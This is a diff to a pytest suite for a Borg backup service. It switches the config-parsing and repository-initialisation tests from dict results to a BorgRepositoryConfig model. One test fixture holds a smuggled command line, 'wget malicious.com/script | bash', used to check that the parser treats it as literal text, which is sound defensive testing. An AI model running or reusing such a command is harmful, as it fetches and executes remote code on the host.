@@ -17,6 +17,7 @@ All tests use proper mocking to avoid external dependencies.
 import pytest
 from unittest.mock import Mock, AsyncMock, patch, mock_open
 
+from borgitory.models.borg_info import BorgRepositoryConfig
 from borgitory.services.borg_service import BorgService
 from borgitory.models.database import Repository
 from borgitory.services.simple_command_runner import CommandResult
@@ -87,9 +88,9 @@ class TestParseBorgConfig:
         with patch("os.path.exists", return_value=False):
             result = self.borg_service._parse_borg_config("/nonexistent/repo")
 
-            assert result["mode"] == "unknown"
-            assert result["requires_keyfile"] is False
-            assert "Config file not found" in result["preview"]
+            assert result.mode == "unknown"
+            assert result.requires_keyfile is False
+            assert "Config file not found" in result.preview
 
     def test_parse_config_repokey_mode(self) -> None:
         """Test parsing repository with repokey encryption."""
@@ -108,9 +109,9 @@ key = very_long_key_data_that_indicates_repokey_mode_with_embedded_encryption_ke
         ), patch("os.listdir", return_value=[]):
             result = self.borg_service._parse_borg_config("/test/repo")
 
-            assert result["mode"] == "repokey"
-            assert result["requires_keyfile"] is False
-            assert "repokey mode" in result["preview"]
+            assert result.mode == "repokey"
+            assert result.requires_keyfile is False
+            assert "repokey mode" in result.preview
 
     def test_parse_config_keyfile_mode(self) -> None:
         """Test parsing repository with keyfile encryption."""
@@ -129,10 +130,10 @@ key =
         ), patch("os.listdir", return_value=["key.abc123", "data"]):
             result = self.borg_service._parse_borg_config("/test/repo")
 
-            assert result["mode"] == "keyfile"
-            assert result["requires_keyfile"] is True
-            assert "keyfile mode" in result["preview"]
-            assert "key.abc123" in result["preview"]
+            assert result.mode == "keyfile"
+            assert result.requires_keyfile is True
+            assert "keyfile mode" in result.preview
+            assert "key.abc123" in result.preview
 
     def test_parse_config_unencrypted(self) -> None:
         """Test parsing unencrypted repository."""
@@ -150,9 +151,9 @@ additional_free_space = 0
         ), patch("os.listdir", return_value=[]):
             result = self.borg_service._parse_borg_config("/test/repo")
 
-            assert result["mode"] == "none"
-            assert result["requires_keyfile"] is False
-            assert "Unencrypted repository" in result["preview"]
+            assert result.mode == "none"
+            assert result.requires_keyfile is False
+            assert "Unencrypted repository" in result.preview
 
     def test_parse_config_invalid_repository(self) -> None:
         """Test parsing invalid repository config."""
@@ -165,9 +166,9 @@ some_key = some_value
         ):
             result = self.borg_service._parse_borg_config("/test/repo")
 
-            assert result["mode"] == "invalid"
-            assert result["requires_keyfile"] is False
-            assert "Not a valid Borg repository" in result["preview"]
+            assert result.mode == "invalid"
+            assert result.requires_keyfile is False
+            assert "Not a valid Borg repository" in result.preview
 
     def test_parse_config_read_error(self) -> None:
         """Test handling of config file read errors."""
@@ -176,9 +177,9 @@ some_key = some_value
         ):
             result = self.borg_service._parse_borg_config("/test/repo")
 
-            assert result["mode"] == "error"
-            assert result["requires_keyfile"] is False
-            assert "Error reading config" in result["preview"]
+            assert result.mode == "error"
+            assert result.requires_keyfile is False
+            assert "Error reading config" in result.preview
 
     def test_parse_config_malformed_ini(self) -> None:
         """Test handling of malformed INI file."""
@@ -192,8 +193,8 @@ key = value without proper section
         ):
             result = self.borg_service._parse_borg_config("/test/repo")
 
-            assert result["mode"] == "error"
-            assert "Error reading config" in result["preview"]
+            assert result.mode == "error"
+            assert "Error reading config" in result.preview
 
 
 class TestRepositoryOperations:
@@ -215,7 +216,6 @@ class TestRepositoryOperations:
     @pytest.mark.asyncio
     async def test_initialize_repository_success(self) -> None:
         """Test successful repository initialization."""
-        from borgitory.services.simple_command_runner import CommandResult
 
         mock_command_result = CommandResult(
             success=True, return_code=0, stdout="", stderr="", duration=1.0
@@ -235,14 +235,13 @@ class TestRepositoryOperations:
 
             result = await self.borg_service.initialize_repository(self.mock_repository)
 
-            assert result["success"] is True
-            assert "initialized successfully" in result["message"]
+            assert result.success is True
+            assert "initialized successfully" in result.message
             self.mock_command_runner.run_command.assert_called_once()
 
     @pytest.mark.asyncio
     async def test_initialize_repository_already_exists(self) -> None:
         """Test repository initialization when repo already exists."""
-        from borgitory.services.simple_command_runner import CommandResult
 
         mock_command_result = CommandResult(
             success=False,
@@ -263,8 +262,8 @@ class TestRepositoryOperations:
 
             result = await self.borg_service.initialize_repository(self.mock_repository)
 
-            assert result["success"] is True
-            assert "already exists" in result["message"]
+            assert result.success is True
+            assert "already exists" in result.message
 
     @pytest.mark.asyncio
     async def test_verify_repository_access_success(self) -> None:
@@ -469,10 +468,9 @@ key = ; wget malicious.com/script | bash
             result = self.borg_service._parse_borg_config("/test/repo")
 
             # Should treat as normal config data, not execute
-            assert isinstance(result, dict)
-            assert "mode" in result
+            assert isinstance(result, BorgRepositoryConfig)
             # The malicious commands should be treated as literal string values
-            assert result["mode"] in ["none", "encrypted", "error"]
+            assert result.mode in ["none", "encrypted", "error"]
 
 
 class TestEdgeCasesAndBoundaryConditions:
@@ -533,8 +531,8 @@ key = résumé_ñoño
         ), patch("os.listdir", return_value=[]):
             result = self.borg_service._parse_borg_config("/utf8/repo")
 
-            assert isinstance(result, dict)
-            assert "mode" in result
+            assert isinstance(result, BorgRepositoryConfig)
+            assert result.mode in ["none", "encrypted", "error"]
             # Should handle UTF-8 content gracefully
 
     @pytest.mark.asyncio
@@ -559,8 +557,8 @@ key = résumé_ñoño
             "builtins.open", mock_open(read_data="")
         ), patch("os.listdir", return_value=[]):
             result = self.borg_service._parse_borg_config("/empty/repo")
-            assert result["mode"] == "invalid"
-            assert "Not a valid Borg repository" in result["preview"]
+            assert result.mode == "invalid"
+            assert "Not a valid Borg repository" in result.preview
 
         # Test whitespace-only config
         whitespace_content = "   \n\t\n   \n"
@@ -568,7 +566,7 @@ key = résumé_ñoño
             "builtins.open", mock_open(read_data=whitespace_content)
         ), patch("os.listdir", return_value=[]):
             result = self.borg_service._parse_borg_config("/whitespace/repo")
-            assert result["mode"] == "invalid"
+            assert result.mode == "invalid"
 
     def test_special_characters_in_paths(self) -> None:
         """Test handling of special characters in file paths."""
@@ -634,12 +632,14 @@ class TestBorgServiceRepositoryScanning:
         self.mock_command_runner.run_command = AsyncMock(return_value=mock_result)
 
         # Mock the _parse_borg_config method to return encryption info
+        from borgitory.models.borg_info import BorgRepositoryConfig
+
         self.borg_service._parse_borg_config = Mock(
-            return_value={
-                "mode": "repokey",
-                "requires_keyfile": False,
-                "preview": "Repository config preview",
-            }
+            return_value=BorgRepositoryConfig(
+                mode="repokey",
+                requires_keyfile=False,
+                preview="Repository config preview",
+            )
         )
 
         # Mock sanitize_path to return paths unchanged for testing
@@ -763,11 +763,11 @@ class TestBorgServiceRepositoryScanning:
 
         # Mock _parse_borg_config
         self.borg_service._parse_borg_config = Mock(
-            return_value={
-                "mode": "repokey",
-                "requires_keyfile": False,
-                "preview": "Valid repo config",
-            }
+            return_value=BorgRepositoryConfig(
+                mode="repokey",
+                requires_keyfile=False,
+                preview="Valid repo config",
+            )
         )
 
         result = await self.borg_service.scan_for_repositories()
